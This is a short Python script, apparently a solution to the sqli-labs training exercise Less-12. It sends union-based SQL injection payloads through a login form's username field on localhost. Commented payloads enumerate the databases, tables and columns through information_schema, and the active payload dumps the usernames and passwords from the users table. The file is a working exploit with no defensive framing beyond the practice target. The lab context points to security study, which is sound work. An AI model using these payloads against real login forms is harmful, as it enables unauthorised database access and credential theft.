import requests
# inject_type = string
inject_num = '-1")'
# poc 填写 sql注入语句
# 查询所有数据库名称
# poc = f"{inject_num} union select 1,group_concat(schema_name) from information_schema.schemata -- "
# 查询数据库中的所有表名
table_schema='security'
# poc = f"{inject_num} union select 1,group_concat(table_name) from information_schema.tables where table_schema='{table_schema}' -- "
# # 查询表中的所有字段
table_name='users'
# poc = f"{inject_num} union select 1,group_concat(column_name) from information_schema.columns where table_name='{table_name}' and table_schema='{table_schema}' -- "
# # 查询表中所有的内容
ziduan='username,0x7e,password'
poc = f"{inject_num} union select 1,group_concat({ziduan}) from {table_name}#"
print(poc)
parms = {'uname': poc,'passwd':'admin','submit':'Submit'}
url = "http://localhost/sqli-labs/Less-12/"

def get_fun():
    results = requests.post(url,data=parms).text
    print(results)

if __name__ == '__main__':
    get_fun()